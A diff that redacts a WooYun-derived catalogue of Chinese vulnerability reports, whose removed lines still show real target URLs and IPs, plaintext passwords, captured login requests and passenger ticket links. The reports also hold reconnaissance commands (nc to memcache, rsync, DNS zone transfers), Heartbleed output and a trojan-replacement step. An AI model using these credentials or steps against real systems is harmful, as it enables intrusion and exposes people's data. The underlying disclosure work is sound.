-**详情**: http://114.80.121.110:8990/login.do土豆的公用模板集成管理平台，没有验证码，可直接进行暴力破解，未尝试该服务器上开放有11211端口可远程连接，里面有用户的相关缓存数据。可以进行操作及删除若是修改用户的相应缓存可挂些东西的话。。
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -10578,8 +10578,8 @@
 ---
 
 ---
-### [wooyun-2012-011660] 新版腾讯手机管家导致手机声音的输出全失效（包括听歌、看电视没声音、来电没铃音、通话听不到对方声音等）
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-011660] 新版某互联网公司手机管家导致手机声音的输出全失效（包括听歌、看电视没声音、来电没铃音、通话听不到对方声音等）
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -10590,13 +10590,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开始以为自己手机有问题，最后经过几次专门的测试之后，发现是这个新版的腾讯手机管家造成的问题。bug重现方法：1 用usb通过腾讯手机管家将手机与电脑链接。2 点击文件管理，给系统默认生成在sd卡上面的vedio文件夹中，任意拖一部视频过去。3 断开连接，就会发现手机悲剧了！听歌、看视频都没有声音了；来电铃音也不响了；通话听不到对方说话（这个我用10086测试确认了）4 出现这个情况后，不管怎么设置手机都不行，只有重启手机才会恢复正常。PS 用以前版本的时候无此类情况，更新最新版本后就出现此类bug！影响正常使用很严重。其他情况可否造成此类情况暂且不知，上面所说情况不是偶然现象，那个bug是可以重现的。
+**详情**: 开始以为自己手机有问题，最后经过几次专门的测试之后，发现是这个新版的某互联网公司手机管家造成的问题。bug重现方法：1 用usb通过某互联网公司手机管家将手机与电脑链接。2 点击文件管理，给系统默认生成在sd卡上面的vedio文件夹中，任意拖一部视频过去。3 断开连接，就会发现手机悲剧了！听歌、看视频都没有声音了；来电铃音也不响了；通话听不到对方说话（这个我用10086测试确认了）4 出现这个情况后，不管怎么设置手机都不行，只有重启手机才会恢复正常。PS 用以前版本的时候无此类情况，更新最新版本后就出现此类bug！影响正常使用很严重。其他情况可否造成此类情况暂且不知，上面所说情况不是偶然现象，那个bug是可以重现的。
 
 **POC**: 此漏洞没有办法截图证明。
 
 **绕过**: 直接利用
 
-**修复**: 本人猜测是新版的腾讯手机管家的逻辑或者配置方面有漏洞，还请就以上描述进行修补。你们更专业！
+**修复**: 本人猜测是新版的某互联网公司手机管家的逻辑或者配置方面有漏洞，还请就以上描述进行修补。你们更专业！
 ---
 
 ---
@@ -10612,9 +10612,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://erp.emaotai.cn/b2b/ele-business/salesman/index.aspyy yy
+**详情**: https://example.com/[已脱敏] yy
 
-**POC**: http://erp.emaotai.cn/b2b/ele-business/salesman/index.aspyy yy
+**POC**: https://example.com/[已脱敏] yy
 
 **绕过**: 直接利用
 
@@ -10634,7 +10634,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/HikoQiu/wsdutil/blob/c0c5451c319038f837e0ecc7eb0ae3dea8716704/TestUtils/src/com/weisd/email/Test.java账号：junbaohf    邮箱输入的时候不用加@这部分后缀密码：998835
+**详情**: https://example.com/[已脱敏]    邮箱输入的时候不用加@这部分后缀密码：998835
 
 **POC**: 通讯录
 
@@ -10680,7 +10680,7 @@
 
 **详情**: 
 
-**POC**: Microsoft Windows [版本 6.1.7601]版权所有 (c) 2009 Microsoft Corporation。保留所有权利。C:\Users\Administrator>cd c:/python27c:\Python27>iis_shortname_Scan.py http://dlxtag.lenovo.com/server is vulerable, please wait, scanning...Found /b****    [scan in progress]Found /d****    [scan in progress]Found /i****    [
+**POC**: Microsoft Windows [版本 6.1.7601]版权所有 (c) 2009 Microsoft Corporation。保留所有权利。C:\Users\Administrator>cd c:/python27c:\Python27>iis_shortname_Scan.py https://example.com/[已脱敏] is vulerable, please wait, scanning...Found /b****    [scan in progress]Found /d****    [scan in progress]Found /i****    [
 
 **绕过**: 直接利用
 
@@ -10722,7 +10722,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 收到的邮件如下：看到邮件的第一眼就知道是钓鱼邮件，查看下方链接为"http://118.193.211.239/c.html",故跟踪了一下网站看能不能拿到一些有用的信息。先确认了一下是asp网站，开动目录扫描工具，扫到两处敏感目录，如下：两个目录下列出了一些文件，但是都不能访问和下载，访问inc目录下的Conn.asp目录时看到以下报错信息：红色圈注地方可以看到access数据库路径，尝试118.193.211.239/inc/mydata/mydata.mdb未果，猜了一下url为118.193.211.239/mydata/mydata.mdb顺利下载到数据库文件，如下：首页或login.asp为管理员登录页面，密码从数据库中看是amdin,admin，可能登录页面有问题，不能进行登录。密码泄露人员在不断增加，希望有人可以进行制止，并及时通知到相关泄露人，由于精力有限，我只通知了其中
+**详情**: 收到的邮件如下：看到邮件的第一眼就知道是钓鱼邮件，查看下方链接为"http://[IP已脱敏]
 
 **POC**: 和之前很多钓鱼邮件事件所用的手段类似。
 
@@ -10744,7 +10744,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://116.113.179.98/
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -10766,9 +10766,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ellechina.com/ellechina.tar.gz直接下载
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 整理数据库敏感信息如下：<?phpdefine('UC_CONNECT', 'post');define('UC_DBHOST', '192.168.1.204');define('UC_DBUSER', 'font');define('UC_DBPW', '1q2w3e4r');define('UC_DBNAME', 'efwp_ucenter1-5-2');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`efwp_ucenter1-5-2`.uc_');define('UC_DBCONNECT', '0');define('
+**POC**: 整理数据库敏感信息如下：<?phpdefine('UC_CONNECT', 'post');define('UC_DBHOST', '[IP已脱敏]');define('UC_DBUSER', 'font');define('UC_DBPW', '1q2w3e4r');define('UC_DBNAME', 'efwp_ucenter1-5-2');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`efwp_ucenter1-5-2`.uc_');define('UC_DBCONNECT', '0');define('
 
 **绕过**: 直接利用
 
@@ -10788,13 +10788,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: memcache配置不当ping www.geekpark.netnc -vv 123.103.17.42 11211rsync配置不当root@hack:/home/hack# rsync www.geekpark.net::databak        	all databak data www & sqlbackup         	all databak data www & sqlhtdocs         	htdocs
+**详情**: memcache配置不当ping www.geekpark.netnc -vv [IP已脱敏] 11211rsync配置不当root@hack:/home/hack# rsync www.geekpark.net::databak        	all databak data www & sqlbackup         	all databak data www & sqlhtdocs         	htdocs
 
-**POC**: ping www.geekpark.netnc -vv 123.103.17.42 11211
+**POC**: ping www.geekpark.netnc -vv [IP已脱敏] 11211
 
 **绕过**: 直接利用
 
-**修复**: 增加ip访问策略memcache安全配置http://drops.wooyun.org/papers/865rsync安全配置http://drops.wooyun.org/papers/161
+**修复**: 增加ip访问策略memcache安全配置https://example.com/[已脱敏]
 ---
 
 ---
@@ -10810,7 +10810,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用fofa搜了下，发现很多子域名其中有个http://gitlab.baozou.com打开有登录和找回密码功能。- -猜不着。于是利用找回密码功能，拿着暴漫管理员的域名邮箱试了试。 提示已发送找回密码邮件zha****ei@baozou.com登录邮箱猜对了，开始猜密码。看样子管理员邮箱的前缀应该是以名字命名，于是尝试登录成功
+**详情**: 用fofa搜了下，发现很多子域名其中有个https://example.com/[已脱敏] -猜不着。于是利用找回密码功能，拿着暴漫管理员的域名邮箱试了试。 提示已发送找回密码邮件zha****ei@baozou.com登录邮箱猜对了，开始猜密码。看样子管理员邮箱的前缀应该是以名字命名，于是尝试登录成功
 
 **POC**: 这些都可以下载其他用户和项目以及一些配置文件数据库配置信息  用户数据有近4000000存放网站图片等文件的配置信息不明觉厉东西太多太多了。。。这只是冰山一角没有去深入，继续研究可能危害会更大
 
@@ -10920,7 +10920,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://haokan.17k.com/WEB-INF/classes/jdbc.propertieshttp://haokan.17k.com/WEB-INF/web.xmlhttp://haokan.17k.com/WEB-INF/classes/log4j.properties
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10942,7 +10942,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: APP下载统计http://www.wandoujia.com/apps/com.gold.palm.kitchen   豌豆荚 44 万人安装http://android.myapp.com/myapp/detail.htm?apkName=com.gold.palm.kitchen 应用宝  117万下载http://apk.hiapk.com/appinfo/com.gold.palm.kitchen    安卓市场  60.1万热度http://zhushou.360.cn/detail/index/soft_id/485874?recrefer=SE_D_%E6%8E%8C%E5%8E%A8  360助手   76万次location : http://boss.izhangchu.com/main/indextoplocation : http://boss.izhangchu
+**详情**: APP下载统计https://example.com/[已脱敏]   豌豆荚 44 万人安装https://example.com/[已脱敏] 应用宝  117万下载https://example.com/[已脱敏]    安卓市场  60.1万热度https://example.com/[已脱敏]  360助手   76万次location : https://example.com/[已脱敏] : https://example.com/[已脱敏]
 
 **POC**: 11
 
@@ -10964,9 +10964,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://admin.docin.com/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://admin.docin.com/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10997,7 +10997,7 @@
 
 ---
 ### [wooyun-2014-073302] 中国联合网络通信有限公司新疆分公司服务器配置不当导致管理平台可重装
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -11008,9 +11008,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://www.165xj.com/install/尼玛吓死我啊！！因为这个安装肯定会导致联通业务造成不可挽回的损失，怕被查水表。所以没有继续，同时为了避免再次上演土豆网被劫持的过程。。。还是交给乌云处理吧。。
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 地址：http://www.165xj.com/install/尼玛吓死我啊！！因为这个安装肯定会导致业务损失，怕被查水表。所以没有继续，同时为了避免再次上演土豆网被劫持的过程。。。还是交给乌云处理。。
+**POC**: 地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11041,7 +11041,7 @@
 
 ---
 ### [wooyun-2011-01847] 移动开发者论坛某管理接口暴漏
-**厂商**: 中国移动 | **年份**: 2011 | **类型**: 应用配置错误
+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -11074,7 +11074,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://*.ganji.com/logs/error.loghttp://*.ganji.com/logs/access.log14.152.69.116 10.1.2.1 10.1.2.165 www.ganji.com 10.1.8.171 [20/Jun/2015:01:00:47+0800] "GET /pub/pub.php?login_username=1690019804&login_password=+lyy520hfl&login_checkcode= HTTP/1.0" 0.011 "0.010" 302 0 "http://www.ganji.com/pub/pub.php?act=pub&method=load&cid=3&domain=bj&from=uc" "Mozilla/5.0 (Linux; U; Android 4.0.4; zh-CN; LT26
+**详情**: http://*.ganji.com/logs/error.loghttp://*.ganji.com/logs/access.log14.152.69.116 [IP已脱敏] [IP已脱敏] www.ganji.com [IP已脱敏] [20/Jun/2015:01:00:47+0800] "GET /pub/pub.php?login_username=1690019804&login_password=+lyy520hfl&login_checkcode= HTTP/1.0" 0.011 "0.010" 302 0 "https://example.com/[已脱敏]" "Mozilla/5.0 (Linux; U; Android 4.0.4; zh-CN; LT26
 
 **POC**: (见原文)
 
@@ -11096,9 +11096,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 海宁市港航管理处http://122.225.84.54/
+**详情**: 海宁市港航管理处http://[IP已脱敏]
 
-**POC**: http://122.225.84.54/20141706071712.asp;.txt密码z
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -11120,7 +11120,7 @@
 
 **详情**: nginx解析漏洞
 
-**POC**: http://www.007.mx/favicon.ico/.phphttp://bbs.007.mx/favicon.ico/.phphttp://pay.007.mx/favicon.ico/.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11162,9 +11162,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 启明旗下安全应用交付厂商太一星辰主站源码包放在根目录下可下载下载目录：http://www.t1networks.com/web.rar
+**详情**: 启明旗下安全应用交付厂商太一星辰主站源码包放在根目录下可下载下载目录：https://example.com/[已脱敏]
 
-**POC**: http://www.t1networks.com/web.rar可以直接下载
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11208,7 +11208,7 @@
 
 **详情**: 
 
-**POC**: 1:测试URL:http://qd.tuanche.com/resin-doc/viewfile/?file=index.jsp2:输出3:扩展>平台上也有默认的example未被处理如:http://qd.tuanche.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xmlhttp://qd.tuanche.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp>还有一些开发配置文件,万一里面存储的是账户或配置信息呢http://tua
+**POC**: 1:测试URL:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11230,11 +11230,11 @@
 
 **详情**: 直接上图~
 
-**POC**: sdau.edu.cn.                             86400    IN    SOA      sdau1.sdau.edu.cn.sdau.edu.cn.                             86400    IN    MX                0sdau.edu.cn.                             86400    IN    NS       sdau1.sdau.edu.cn.202.194.133.2.sdau.edu.cn.               86400    IN    MX 
+**POC**: sdau.edu.cn.                             86400    IN    SOA      sdau1.sdau.edu.cn.sdau.edu.cn.                             86400    IN    MX                0sdau.edu.cn.                             86400    IN    NS       sdau1.sdau.edu.cn.[IP已脱敏].sdau.edu.cn.               86400    IN    MX 
 
 **绕过**: 直接利用
 
-**修复**: 修复方法解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。http://drops.wooyun.org/papers/64
+**修复**: 修复方法解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。https://example.com/[已脱敏]
 ---
 
 ---
@@ -11250,7 +11250,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.141.203.167首页
+**详情**: http://[IP已脱敏]首页
 
 **POC**: ip地址系统管理员权限文件列表
 
@@ -11274,7 +11274,7 @@
 
 **详情**: 如题。
 
-**POC**: 1、地址：http://c1.wecook.cn/.git/config2、3、数据库配置信息3、4、
+**POC**: 1、地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11282,7 +11282,7 @@
 ---
 
 ---
-### [wooyun-2013-039725] 中国电信# 某业务DNS域传送漏洞一枚
+### [wooyun-2013-039725] 某运营商# 某业务DNS域传送漏洞一枚
 **厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
@@ -11294,9 +11294,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信股份有限公司云计算分公司www.ctyun.cnokC:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> ctyun.cnServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:ctyun.cn        nameserver = ns6.ctyun.cnctyun.cn        nameserver = ns4.ctyun.cnctyun.cn        nameserver = ns.ctyun.cnctyun.cn        nameserver = ns2
+**详情**: 某运营商股份有限公司云计算分公司www.ctyun.cnokC:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> ctyun.cnServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:ctyun.cn        nameserver = ns6.ctyun.cnctyun.cn        nameserver = ns4.ctyun.cnctyun.cn        nameserver = ns.ctyun.cnctyun.cn        nameserver = ns2
 
-**POC**: C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> ctyun.cnServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:ctyun.cn        nameserver = ns6.ctyun.cnctyun.cn        nameserver = ns4.ctyun.cnct
+**POC**: C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> ctyun.cnServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:ctyun.cn        nameserver = ns6.ctyun.cnctyun.cn        nameserver = ns4.ctyun.cnct
 
 **绕过**: 直接利用
 
@@ -11316,7 +11316,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://3g.yy.com/bbs 存在论坛程序 任意上传图片木马 菜刀即可链接  现在貌似已经被删了
+**详情**: https://example.com/[已脱敏] 存在论坛程序 任意上传图片木马 菜刀即可链接  现在貌似已经被删了
 
 **POC**: (见原文)
 
@@ -11338,7 +11338,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://omstest.vmall.com这是什么？？？ 商城测试站？？？<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 669... received message: type = 22, ver = 0302, length = 203... received message: type = 22, ver = 0302, length = 4Sending heartbeat request...... received message: type = 24, ver =
+**详情**: https://example.com/[已脱敏] 商城测试站？？？<code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 669... received message: type = 22, ver = 0302, length = 203... received message: type = 22, ver = 0302, length = 4Sending heartbeat request...... received message: type = 24, ver =
 
 **POC**: <code>Connecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 669... received message: type = 22, ver = 0302, length = 203... received message: type = 22, ver = 0302, length = 4Sendin
 
@@ -11371,7 +11371,7 @@
 
 ---
 ### [wooyun-2012-010129] taobao分站爆路径
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 应用配置错误
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -11404,9 +11404,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:skypearl/cn/toPrintCard.action?memberNo=memberNo去掉第一位数字似乎是用户的手机号码。http://skypearl.csair.com/skypearl/cn/toPrintCard.action?memberNo=018601221232&bindStatus=N去掉memberNo=018601221232&bindStatus=N访问即可http://skypearl.csair.com/skypearl/cn/toPrintCard.action?memberNo=018601221232http://skypearl.csair.com/skypearl/cn/toPrintCard.action?memberNo=115713806122
+**详情**: inurl:skypearl/cn/toPrintCard.action?memberNo=memberNo去掉第一位数字似乎是用户的手机号码。https://example.com/[已脱敏]
 
-**POC**: http://skypearl.csair.com/skypearl/cn/toPrintCard.action?memberNo=418620768960http://skypearl.csair.com/skypearl/cn/toPrintCard.action?memberNo=013818934282
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11426,9 +11426,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过nslookup测试找到唯一的一处能列出所有域名的dns服务器。真不容易问题出在：ns2.wanda-group.com我就直接列出来了，千里之堤毁于蚁穴，好几个dns都配置的好好的。。怎么唯独漏了这个呢？把你们所有业务的域名都列出来了。> ls dagexing.com[ns2.wanda-group.com]dagexing.com.                  NS     server = ns1.wanda-group.comdagexing.com.                  NS     server = ns2.wanda-group.comdagexing.com.                  A      60.10.8.79api                            NS     server = ns3.wanda-grou
+**详情**: 通过nslookup测试找到唯一的一处能列出所有域名的dns服务器。真不容易问题出在：ns2.wanda-group.com我就直接列出来了，千里之堤毁于蚁穴，好几个dns都配置的好好的。。怎么唯独漏了这个呢？把你们所有业务的域名都列出来了。> ls dagexing.com[ns2.wanda-group.com]dagexing.com.                  NS     server = ns1.wanda-group.comdagexing.com.                  NS     server = ns2.wanda-group.comdagexing.com.                  A      [IP已脱敏]api                            NS     server = ns3.wanda-grou
 
-**POC**: 没发现什么好玩的。但是发现大连万达的小伙伴们正在开着小会呢！url:http://meeting.wanda.com.cn:18080/Conf/jsp/main/mainAction.do
+**POC**: 没发现什么好玩的。但是发现大连万达的小伙伴们正在开着小会呢！url:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11492,9 +11492,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mail.100msh.com==================密码：100msh======================13	dengqiao	200	false	false	101014	liaozhan	200	false	false	102423	liuyuxiang	200	false	false	101433	caolin	200	false	false	100635	keqingru	200	false	false	102436	liunan	200	false	false	102048	la	200	false	false	99853	alarm01	200	false	false	100862	zhuyequn	200	false	false	102463	chengguobin	200	false	false	103064	gongwenchi	20
+**详情**: https://example.com/[已脱敏]	dengqiao	200	false	false	101014	liaozhan	200	false	false	102423	liuyuxiang	200	false	false	101433	caolin	200	false	false	100635	keqingru	200	false	false	102436	liunan	200	false	false	102048	la	200	false	false	99853	alarm01	200	false	false	100862	zhuyequn	200	false	false	102463	chengguobin	200	false	false	103064	gongwenchi	20
 
-**POC**: 太多，举例登录证明这么多账户，里面什么都有了，如下只是一个人的备忘@100msh.com44060430603381wifi.100msh.com曹林 门禁密码8166PC 有线mac  74:D4:35:28:9D:E6无线mac  0C:82:68:1F:61:33百万点测试环境的数据库账号：mysql:（可以用客户端连接）ip:192.168.10.10port:3306user:100msh_readerpassword:YCQOUUTcVSJscv1xRxGMZQ==100msh00041   01.100msh.com  /index/http://0820.100msh.com/
+**POC**: 太多，举例登录证明这么多账户，里面什么都有了，如下只是一个人的备忘@100msh.com44060430603381wifi.100msh.com曹林 门禁密码8166PC 有线mac  74:D4:35:28:9D:E6无线mac  0C:82:68:1F:61:33百万点测试环境的数据库账号：mysql:（可以用客户端连接）ip:[IP已脱敏]port:3306user:100msh_readerpassword:YCQOUUTcVSJscv1xRxGMZQ==100msh00041   01.100msh.com  /index/https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11514,9 +11514,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 希望厂商可以送一架飞机模型，特喜欢你们的飞机模型的，我都找了一天泄露web.xml文件http://180.153.27.5/
+**详情**: 希望厂商可以送一架飞机模型，特喜欢你们的飞机模型的，我都找了一天泄露web.xml文件http://[IP已脱敏]
 
-**POC**: http://180.153.27.5//WEB-INF/web.xml
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -11558,9 +11558,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://s7.plsm.wan.360.cn/index.php
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://s7.plsm.wan.360.cn/index.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11580,9 +11580,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tingbook.com:80/Activity.rarhttp://www.tingbook.com:80/user.rar
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.tingbook.com:80/Activity.rar
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11602,7 +11602,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://www.chinalaw.gov.cn/
+**详情**: 地址：https://example.com/[已脱敏]
 
 **POC**: 泄露信息:; <<>> DiG 9.8.3-P1 <<>> @ns.chinalaw.gov.cn. axfr chinalaw.gov.cn; (1 server found);; global options: +cmdchinalaw.gov.cn.	86400	IN	SOA	ns.chinalaw.gov.cn. blasonghl.chinalaw.gov.cn.chinalaw.gov.cn. 32 28800 7200 604800 86400chinalaw.gov.cn.	86400	IN	NS	ns.chinalaw.gov.cn.chinalaw.gov.cn.	8640
 
@@ -11626,7 +11626,7 @@
 
 **详情**: NTFS文件系统的测试机，正常安装搜狗输入法，新建一个user权限的test用户，此用户允许在：C:\Program Files\SogouInput目录及其子目录下修改文件。
 
-**POC**: 替换C:\Program Files\SogouInput\6.0.0.5909\config.exe文件为木马文件，当用户点击配置的时候会激活木马，在WinXP下测试通过。
+**POC**: 替换C:\Program Files\SogouInput\[IP已脱敏]9\config.exe文件为木马文件，当用户点击配置的时候会激活木马，在WinXP下测试通过。
 
 **绕过**: 直接利用
 
@@ -11646,9 +11646,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01:http://mt.longtugame.com/mt.zip其余敏感文件自己懂得、点到为止！
+**详情**: 0x01:https://example.com/[已脱敏]
 
-**POC**: <?phpreturn array ('default' => array ('hostname' => '172.16.200.29','database' => 'mt_cms','username' => 'root','password' => '','tablepre' => 'mt_','charset' => 'utf8','type' => 'mysql','debug' => true,'pconnect' => 0,'autoconnect' => 0),);?>
+**POC**: <?phpreturn array ('default' => array ('hostname' => '[IP已脱敏]','database' => 'mt_cms','username' => 'root','password' => '','tablepre' => 'mt_','charset' => 'utf8','type' => 'mysql','debug' => true,'pconnect' => 0,'autoconnect' => 0),);?>
 
 **绕过**: 直接利用
 
@@ -11668,9 +11668,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://www.ceair.com/server/ticket.html?tktNo=随便打开1个这时候会记忆直接引用接口查询第一次查询会验证错误，改下验证码即可http://www.ceair.com/server/ticket.html?tktNo=7812182280777&paxName=%E5%85%B3%E5%88%A9%E8%90%8D&certify=p46ahttp://www.ceair.com/server/ticket.html?tktNo=781-2496119556&paxName=%E9%BB%84%E7%8E%BA&certify=7p347http://www.ceair.com/server/ticket.html?tktNo=7812494402973&paxName=%E9%B2%81%E7%9D%BF&certify=ngpn
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://www.ceair.com/server/ticket.html?tktNo=7812487262194&paxName=%E7%94%B0%E4%BA%88%E6%B7%87&certify=h873http://www.ceair.com/server/ticket.html?tktNo=7812182280777&paxName=%E5%85%B3%E5%88%A9%E8%90%8D&certify=p46ahttp://www.ceair.com/server/ticket.html?tktNo=781-2496119556&paxName=%E9%BB%84%E7%8E
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11690,7 +11690,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: root@kali:~/mark0smith/target# rsync 119.254.112.163::dpcserviceroot@kali:~/mark0smith/target# rsync 119.254.112.163::dpcservicefile has vanished: "/proc" (in dpcservice)drwxr-xr-x          4,096 2015/08/30 20:27:54 .-rw-r--r--    456,270,058 2015/08/30 04:03:08 file_move.sql-rw-r--r--          1,333 2015/08/30 08:36:44 wechat.sqldrwxr-xr-x         28,672 2015/09/15 02:39:46 MobileServicedrwxr-xr-
+**详情**: root@kali:~/mark0smith/target# rsync [IP已脱敏]::dpcserviceroot@kali:~/mark0smith/target# rsync [IP已脱敏]::dpcservicefile has vanished: "/proc" (in dpcservice)drwxr-xr-x          4,096 2015/08/30 20:27:54 .-rw-r--r--    456,270,058 2015/08/30 04:03:08 file_move.sql-rw-r--r--          1,333 2015/08/30 08:36:44 wechat.sqldrwxr-xr-x         28,672 2015/09/15 02:39:46 MobileServicedrwxr-xr-
 
 **POC**: (见原文)
 
@@ -11712,9 +11712,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: C:\Users\Administrator>nslookup默认服务器:  cache-lf-3Address:  202.99.160.68> set type=ns> 00615.net服务器:  cache-lf-3Address:  202.99.160.68非权威应答:00615.net       nameserver = ns1.00615.net> server ns1.00615.net默认服务器:  ns1.00615.netAddress:  218.9.77.66> ls -d 00615.net[ns1.00615.net]00615.net.                     SOA    ns1.00615.net lh.00615.com.cn. (1051167306 10800 3600 604800 38400)00615.net.      
+**详情**: C:\Users\Administrator>nslookup默认服务器:  cache-lf-3Address:  [IP已脱敏]> set type=ns> 00615.net服务器:  cache-lf-3Address:  [IP已脱敏]非权威应答:00615.net       nameserver = ns1.00615.net> server ns1.00615.net默认服务器:  ns1.00615.netAddress:  [IP已脱敏]> ls -d 00615.net[ns1.00615.net]00615.net.                     SOA    ns1.00615.net lh.00615.com.cn. (1051167306 10800 3600 604800 38400)00615.net.      
 
-**POC**: C:\Users\Administrator>nslookup默认服务器:  cache-lf-3Address:  202.99.160.68> set type=ns> 00615.net服务器:  cache-lf-3Address:  202.99.160.68非权威应答:00615.net       nameserver = ns1.00615.net> server ns1.00615.net默认服务器:  ns1.00615.netAddress:  218.9.77.66> ls -d 00615.net[ns1.00615.net]00615.net.           
+**POC**: C:\Users\Administrator>nslookup默认服务器:  cache-lf-3Address:  [IP已脱敏]> set type=ns> 00615.net服务器:  cache-lf-3Address:  [IP已脱敏]非权威应答:00615.net       nameserver = ns1.00615.net> server ns1.00615.net默认服务器:  ns1.00615.netAddress:  [IP已脱敏]> ls -d 00615.net[ns1.00615.net]00615.net.           
 
 **绕过**: 直接利用
 
@@ -11734,9 +11734,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
